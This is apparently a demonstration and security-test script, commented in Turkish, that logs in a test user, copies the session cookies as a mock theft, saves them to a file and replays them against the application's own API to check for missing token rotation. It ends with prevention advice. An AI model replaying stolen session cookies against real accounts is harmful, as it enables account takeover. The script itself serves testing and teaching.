"""
Cookie Replay Attack - Live Demo
Saldırgan: Bu script
Kurban: Kullanıcı (sen)
"""

import requests
import time
from config import API_URL

print("🔴 COOKIE REPLAY ATTACK - LIVE DEMO")
print("="*60)

# ADIM 1: KURBAN LOGIN OLUR
print("\n[STEP 1] VICTIM LOGIN")
print("-"*60)

victim_session = requests.Session()

login_response = victim_session.post(f"{API_URL}/auth/login", json={
    "username": "asdasd1",
    "password": "asdasd1"
})

if login_response.status_code == 200:
    print("✅ Victim logged in successfully")
else:
    print(f"❌ Login failed: {login_response.status_code}")
    exit(1)

# Kurbanın cookie'sini göster
victim_cookies = victim_session.cookies.get_dict()
print(f"\n[VICTIM] Your cookies:")
for key, value in victim_cookies.items():
    print(f"  {key} = {value[:50]}..." if len(value) > 50 else f"  {key} = {value}")

# ADIM 2: SALDIRGAN COOKIE'Yİ ÇALAR
print("\n[STEP 2] ATTACKER STEALS COOKIE")
print("-"*60)

# Simülasyon: Saldırgan cookie'yi intercept etti
# (Gerçekte: MITM, XSS, phishing ile çalınabilir)
stolen_cookies = victim_cookies.copy()

print("🔴 [ATTACKER] Cookie stolen!")
print(f"   Stolen cookies: {stolen_cookies}")

# Cookie'yi dosyaya kaydet
import json
with open('stolen_cookie.json', 'w') as f:
    json.dump(stolen_cookies, f, indent=2)

print("   Saved to: stolen_cookie.json")

# ADIM 3: SALDIRGAN COOKIE'Yİ KULLANIR
print("\n[STEP 3] ATTACKER USES STOLEN COOKIE")
print("-"*60)

# Saldırgan yeni bir session oluşturur
attacker_session = requests.Session()

# Çalınan cookie'leri ekler
for key, value in stolen_cookies.items():
    attacker_session.cookies.set(key, value)

print("🔴 [ATTACKER] Using stolen cookie to access victim's account...")

# Kurbanın bilgilerine erişmeyi dene
response = attacker_session.get(f"{API_URL}/users/me")

if response.status_code == 200:
    user_data = response.json()
    print("\n🔴 VULNERABLE! Attacker accessed victim's account!")
    print("\n[ATTACKER] Victim's data:")
    print(json.dumps(user_data, indent=2))
else:
    print(f"\n✅ SAFE - Access denied: {response.status_code}")

# ADIM 4: COOKIE REPLAY TEST
print("\n[STEP 4] COOKIE REPLAY TEST")
print("-"*60)

print("🔴 [ATTACKER] Attempting to replay cookie 10 times...")
print()

success_count = 0

for i in range(10):
    # Her seferinde aynı cookie'yi kullan
    response = attacker_session.get(f"{API_URL}/users/me")
    
    if response.status_code == 200:
        success_count += 1
        print(f"  [{i+1}] ✅ Cookie still valid - Replay successful!")
    else:
        print(f"  [{i+1}] ❌ Cookie rejected - Replay blocked")
        break
    
    time.sleep(0.5)

# SONUÇ
print("\n" + "="*60)
print("📊 REPLAY ATTACK RESULTS")
print("="*60)

print(f"\nSuccess Rate: {success_count}/10 ({success_count*10}%)")

if success_count == 10:
    print(f"\n🔴 CRITICAL VULNERABILITY!")
    print("   - Cookie can be replayed indefinitely")
    print("   - No token rotation")
    print("   - Stolen cookie = permanent access")
    print("\n   IMPACT:")
    print("   - Attacker can access account anytime")
    print("   - Even after victim logs out")
    print("   - Until cookie expires (if ever)")
elif success_count == 0:
    print(f"\n✅ SAFE!")
    print("   - Cookie invalidated after first use")
    print("   - One-time token implemented")
else:
    print(f"\n⚠️  PARTIAL PROTECTION")
    print(f"   - Cookie valid for {success_count} uses")
    print("   - Limited replay protection")

# ADIM 5: KURBAN HALA ERİŞEBİLİYOR MU?
print("\n[STEP 5] VICTIM ACCESS CHECK")
print("-"*60)

print("[VICTIM] Checking if you can still access your account...")

victim_response = victim_session.get(f"{API_URL}/users/me")

if victim_response.status_code == 200:
    print("✅ [VICTIM] You can still access your account")
    print("   (Both attacker AND victim have access!)")
else:
    print("❌ [VICTIM] Your session was invalidated")

# ÖNERİLER
print("\n" + "="*60)
print("🛡️  PREVENTION")
print("="*60)

print("""
To prevent Cookie Replay attacks:

1. TOKEN ROTATION:
   - Generate new token on each request
   - Invalidate old token immediately

2. ONE-TIME TOKENS:
   - Token can only be used once
   - Requires refresh token mechanism

3. SHORT EXPIRATION:
   - Tokens expire quickly (5-15 minutes)
   - Reduces attack window

4. LOGOUT INVALIDATION:
   - Logout must invalidate all tokens
   - Server-side token blacklist

5. ANOMALY DETECTION:
   - Detect simultaneous usage from different IPs
   - Alert user of suspicious activity
""")

print("\n🔴 Cookie Replay Attack Demo Complete!")
